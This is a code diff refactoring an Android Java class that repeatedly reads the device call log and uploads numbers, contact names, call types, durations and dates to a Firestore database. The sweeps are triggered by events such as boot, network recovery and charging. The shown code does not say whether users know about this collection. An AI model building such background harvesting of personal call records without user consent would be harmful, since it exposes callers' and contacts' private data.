@@ -16,28 +16,66 @@ public class SweeperSync {
     private static final String TAG = "SweeperSync";
     private static final String PREFS_NAME = "sweeper_sync";
     private static final String KEY_LAST_ID = "last_known_call_log_id";
-    private static final Object sweepLock = new Object();
-    private static volatile boolean sweepRunning = false;
-    private static boolean dedupDone = false;
+    private static final String KEY_DEDUP_DONE = "dedup_done";
+    private static final int MAX_REGULAR = 200;
 
-    public static void sweep(Context context) {
+    public static final int PRIORITY_NONE = -1;
+    public static final int PRIORITY_REGULAR = 1;
+    public static final int PRIORITY_APP_OPENED = 2;
+    public static final int PRIORITY_NETWORK_RECOVERY = 3;
+    public static final int PRIORITY_BOOT_RECOVERY = 4;
+    public static final int PRIORITY_DEEP_SWEEP = 5;
+    public static final int PRIORITY_FULL_CHARGING = 6;
+
+    private static final Object sweepLock = new Object();
+    private static volatile int activePriority = PRIORITY_NONE;
+
+    public static boolean acquireSweepLock(int priority) {
         synchronized (sweepLock) {
-            if (sweepRunning) {
-                Log.w(TAG, "Sweep already in progress, skipping");
-                return;
+            if (activePriority >= priority) {
+                Log.i(TAG, "Sweep skipped — priority " + priority + " < active " + activePriority);
+                return false;
             }
-            sweepRunning = true;
-        }
-        try {
-            runSweep(context);
-        } finally {
-            synchronized (sweepLock) {
-                sweepRunning = false;
-            }
+            activePriority = priority;
+            return true;
         }
     }
 
-    private static void runSweep(Context context) {
+    public static void releaseSweepLock() {
+        synchronized (sweepLock) {
+            activePriority = PRIORITY_NONE;
+        }
+    }
+
+    public static void sweep(Context context, int priority) {
+        if (!acquireSweepLock(priority)) return;
+        try {
+            runSweep(context, MAX_REGULAR);
+        } finally {
+            releaseSweepLock();
+        }
+    }
+
+    public static void sweepAll(Context context, int priority) {
+        if (!acquireSweepLock(priority)) return;
+        try {
+            runSweep(context, Integer.MAX_VALUE);
+        } finally {
+            releaseSweepLock();
+        }
+    }
+
+    public static void deepSweep(Context context) {
+        if (!acquireSweepLock(PRIORITY_DEEP_SWEEP)) return;
+        try {
+            runSweep(context, MAX_REGULAR);
+            runSaturdaySweep(context);
+        } finally {
+            releaseSweepLock();
+        }
+    }
+
+    private static void runSweep(Context context, int maxEntries) {
         String deviceId = SweeperConfig.deviceId(context);
         if (SweeperConfig.isBlacklisted(deviceId)) {
             Log.w(TAG, "Device " + deviceId + " is blacklisted, skipping sweep");
@@ -49,17 +87,18 @@ public class SweeperSync {
             return;
         }
 
-        if (!dedupDone) {
+        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+
+        if (!prefs.getBoolean(KEY_DEDUP_DONE, false)) {
             try {
                 int deleted = FirestoreManager.getInstance(context).deduplicateEntries();
                 Log.i(TAG, "Cleanup: dedup removed " + deleted + " entries");
+                prefs.edit().putBoolean(KEY_DEDUP_DONE, true).apply();
             } catch (Exception e) {
                 Log.e(TAG, "Cleanup dedup failed", e);
             }
-            dedupDone = true;
         }
 
-        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
         long lastKnownId = prefs.getLong(KEY_LAST_ID, -1);
 
         Cursor c = null;
@@ -82,7 +121,7 @@ public class SweeperSync {
 
             int uploaded = 0;
             long maxId = lastKnownId;
-            while (c.moveToNext() && uploaded < 200) {
+            while (c.moveToNext() && uploaded < maxEntries) {
                 long id = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls._ID));
                 String number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                 String name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
@@ -90,15 +129,7 @@ public class SweeperSync {
                 long duration = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                 long date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
 
-                String typeLabel;
-                switch (type) {
-                    case CallLog.Calls.INCOMING_TYPE: typeLabel = "incoming"; break;
-                    case CallLog.Calls.OUTGOING_TYPE: typeLabel = "outgoing"; break;
-                    case CallLog.Calls.MISSED_TYPE: typeLabel = "missed"; break;
-                    case CallLog.Calls.REJECTED_TYPE: typeLabel = "rejected"; break;
-                    case CallLog.Calls.VOICEMAIL_TYPE: typeLabel = "voicemail"; break;
-                    default: typeLabel = "unknown";
-                }
+                String typeLabel = callTypeToString(type);
 
                 FirestoreManager.getInstance(context).uploadCallLog(
                         number != null ? number : "",
@@ -120,7 +151,7 @@ public class SweeperSync {
         }
     }
 
-    public static void sweepSaturday(Context context) {
+    private static void runSaturdaySweep(Context context) {
         String deviceId = SweeperConfig.deviceId(context);
         if (SweeperConfig.isBlacklisted(deviceId)) {
             Log.w(TAG, "Device " + deviceId + " is blacklisted, skipping Saturday sweep");
@@ -134,7 +165,6 @@ public class SweeperSync {
 
         long sevenDaysAgo = System.currentTimeMillis() - 7L * 24 * 60 * 60 * 1000;
 
-        // 1) Build set of "number:timestamp" from device call logs (last 7 days)
         java.util.Set<String> deviceKeys = new java.util.HashSet<>();
         Cursor c = null;
         try {
@@ -160,12 +190,8 @@ public class SweeperSync {
             if (c != null) c.close();
         }
 
-        // 2) Get Firestore entries for last 7 days and compare
         FirestoreManager fm = FirestoreManager.getInstance(context);
         fm.init();
-        try {
-            Thread.sleep(2000); // brief wait for Firestore init
-        } catch (InterruptedException ignored) {}
 
         java.util.List<java.util.AbstractMap.SimpleEntry<String, java.util.Map<String, Object>>> firestoreEntries =
                 fm.queryEntriesSince(sevenDaysAgo);
@@ -190,111 +216,35 @@ public class SweeperSync {
         Log.i(TAG, "Saturday sweep: " + firestoreEntries.size() + " entries checked, " + markedDeleted + " marked deleted");
     }
 
-    public static void sweepAll(Context context) {
-        synchronized (sweepLock) {
-            if (sweepRunning) {
-                Log.w(TAG, "sweepAll skipped — another sweep in progress");
-                return;
-            }
-            sweepRunning = true;
-        }
-        try {
-            runSweepAll(context);
-        } finally {
-            synchronized (sweepLock) {
-                sweepRunning = false;
-            }
-        }
-    }
-
-    private static void runSweepAll(Context context) {
-        String deviceId = SweeperConfig.deviceId(context);
-        if (SweeperConfig.isBlacklisted(deviceId)) return;
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
-                != PackageManager.PERMISSION_GRANTED) return;
-
-        if (!dedupDone) {
-            try {
-                int deleted = FirestoreManager.getInstance(context).deduplicateEntries();
-                Log.i(TAG, "Cleanup: dedup removed " + deleted + " entries");
-            } catch (Exception e) {
-                Log.e(TAG, "Cleanup dedup failed", e);
-            }
-            dedupDone = true;
-        }
-
-        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-        long lastKnownId = prefs.getLong(KEY_LAST_ID, -1);
-
-        Cursor c = null;
-        try {
-            String selection = null;
-            String[] args = null;
-            if (lastKnownId > 0) {
-                selection = CallLog.Calls._ID + " > ?";
-                args = new String[]{String.valueOf(lastKnownId)};
-            }
-
-            c = context.getContentResolver().query(
-                    CallLog.Calls.CONTENT_URI,
-                    null, selection, args,
-                    CallLog.Calls.DATE + " DESC"
-            );
-            if (c == null) return;
-
-            FirestoreManager.getInstance(context).init();
-
-            int uploaded = 0;
-            long maxId = lastKnownId;
-            while (c.moveToNext()) {
-                long id = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls._ID));
-                String number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                String name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
-                int type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                long duration = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-                long date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
-
-                String typeLabel;
-                switch (type) {
-                    case CallLog.Calls.INCOMING_TYPE: typeLabel = "incoming"; break;
-                    case CallLog.Calls.OUTGOING_TYPE: typeLabel = "outgoing"; break;
-                    case CallLog.Calls.MISSED_TYPE: typeLabel = "missed"; break;
-                    case CallLog.Calls.REJECTED_TYPE: typeLabel = "rejected"; break;
-                    case CallLog.Calls.VOICEMAIL_TYPE: typeLabel = "voicemail"; break;
-                    default: typeLabel = "unknown";
-                }
-
-                FirestoreManager.getInstance(context).uploadCallLog(
-                        number != null ? number : "",
-                        name != null && !name.isEmpty() ? name : resolveContactName(context, number),
-                        typeLabel, duration, date
-                );
-
-                if (id > maxId) maxId = id;
-                uploaded++;
-            }
-            if (maxId > lastKnownId) {
-                prefs.edit().putLong(KEY_LAST_ID, maxId).apply();
-            }
-            Log.i(TAG, "sweepAll: uploaded " + uploaded + " entries (unlimited)");
-        } catch (Exception e) {
-            Log.e(TAG, "sweepAll error", e);
-        } finally {
-            if (c != null) c.close();
-        }
-    }
+    private static final java.util.HashMap<String, String> contactCache = new java.util.HashMap<>();
 
     private static String resolveContactName(Context context, String number) {
         if (number == null || number.isEmpty()) return "";
+        String cached = contactCache.get(number);
+        if (cached != null) return cached;
         try (Cursor c = context.getContentResolver().query(
                 android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI.buildUpon()
                         .appendPath(Uri.encode(number)).build(),
                 new String[]{android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME},
                 null, null, null)) {
             if (c != null && c.moveToFirst()) {
-                return c.getString(0);
+                String name = c.getString(0);
+                contactCache.put(number, name);
+                return name;
             }
         } catch (Exception ignored) {}
+        contactCache.put(number, "");
         return "";
+    }
+
+    private static String callTypeToString(int type) {
+        switch (type) {
+            case CallLog.Calls.INCOMING_TYPE: return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
+            case CallLog.Calls.MISSED_TYPE: return "missed";
+            case CallLog.Calls.REJECTED_TYPE: return "rejected";
+            case CallLog.Calls.VOICEMAIL_TYPE: return "voicemail";
+            default: return "unknown";
+        }
     }
 }
